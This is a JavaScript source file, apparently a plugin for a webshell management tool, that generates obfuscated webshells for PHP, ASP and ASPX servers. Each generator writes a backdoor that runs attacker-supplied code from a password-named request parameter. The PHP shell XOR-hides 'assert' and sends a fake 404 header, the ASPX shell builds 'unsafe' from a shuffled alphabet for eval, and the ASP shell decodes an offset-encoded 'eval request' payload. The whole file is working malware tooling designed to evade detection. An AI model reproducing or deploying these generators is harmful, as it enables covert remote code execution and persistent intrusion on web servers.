/**
 * 核心模块 Core:2.0
 */

class Core {
  constructor(argv) {
    let self = this;
    return new Promise((res, rej) => {
      switch (argv.type) {
        case "php":
          res(self._gen_php(argv.pwd));
          break;
        case "asp":
          res(self._gen_asp(argv.pwd));
          break;
        case "aspx":
          res(self._gen_aspx(argv.pwd));
          break;
        default:
          break;
      }
    })
  }

  // 生成 php shell
  _gen_php(pwd) {
    let key = [0, 0, 0, 0, 0, 0].map(t => parseInt(Math.random() * 256));
    let cipher = "assert".split("").map(t => t.charCodeAt(0)).map((t, i) => t ^ key[i]);
    cipher = cipher.map(t => "\\x" + t.toString(16));
    key = key.map(t => "\\x" + t.toString(16));
    let lines = [0, 1, 2, 3, 4, 5].map((t, i) => `        $_${t} = "${cipher[i]}" ^ "${key[i]}";`).join("\r\n");
    let name = [65, 65, 65, 65].map((t) => String.fromCharCode(parseInt(Math.random() * 26) + t)).join("");
    let code = `<?php 
header('HTTP/1.1 404');
class ${name} { 
    public $c='';
    function __destruct() {
${lines}
        $db =${[0, 1, 2, 3, 4, 5].map((t, i) => `$_${t}`).join(".")};
        return @$db($this->c);
    }
}
$${name.toLowerCase()} = new ${name}();
@$${name.toLowerCase()}->c = $_POST['${pwd}'];
?>`
    return code;
  }

  _gen_aspx(pwd) {
    const randomName = () => [65, 65, 65, 65].map((t) => String.fromCharCode(parseInt(Math.random() * 26) + t)).join("");
    const genCharSet = () => {
      let set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
      let pick = [];
      while (set.length > 0) {
        const idx = parseInt(Math.random() * set.length);
        pick.push(set[idx])
        set[idx] = set[set.length - 1];
        set.pop();
      }
      return pick;
    };
    const indexOf = (x) => charset.map(ch => ch.toLowerCase()).indexOf(x.toLowerCase());
    const charset = genCharSet();
    const charsetName = randomName();
    const nameA = randomName();
    const nameB = randomName();
    return `<%@ Page Language="Jscript" Debug=true%>
<%
var ${charsetName}='${charset.join("")}';
var ${nameA}=Request.Form("${pwd}");
var ${nameB}=${"unsafe".split("").map(c => `${charsetName}(${indexOf(c)})`).join(" + ")};
eval(${nameA}, ${nameB});
%>`;
  }

  _gen_asp(pwd) {
    const randomName = () => [65, 65, 65, 65].map((t) => String.fromCharCode(parseInt(Math.random() * 26) + t)).join("");
    //const passwd = "yzddmr6";
    const payload = `eval request("${pwd}")`;
    const offset = parseInt(Math.random() * 256);
    const paramName = randomName();
    const funcName = randomName();
    var split = "`~-=!@#$%^&*_/+?<>{}|:[]".split("");
    split = split[parseInt(Math.random() * split.length)];
    return `<%
<!--
Function ${funcName}(${paramName}):
	${paramName} = Split(${paramName},"${split}")
	For x=0 To Ubound(${paramName})
		${funcName}=${funcName}&Chr(${paramName}(x)-${offset})
	Next
End Function
EXecutE(${funcName}("${payload.split("").map(chr => chr.charCodeAt(0)).map(code => code+offset).join(split)}"))
-->
%>`;
  }

  _rot13(s) {
    //use a Regular Expression to Replace only the characters that are a-z or A-Z
    return s.replace(/[a-zA-Z]/g, function (c) {
      //Get the character code of the current character and add 13 to it
      //If it is larger than z's character code then subtract 26 to support wrap around.
      return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
    });
  }
  _randint(n, m) {
    return Math.floor(Math.random() * (m - n + 1) + n);
  }
  // 随机产生指定长度字符串
  _randomStr(len) {
    len = len || 8;
    let chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let maxPos = chars.length;
    let pwd = '';
    for (var i = 0; i < len; i++) {
      pwd += chars.charAt(Math.floor(Math.random() * maxPos));
    }
    return pwd;
  }
}

module.exports = Core;
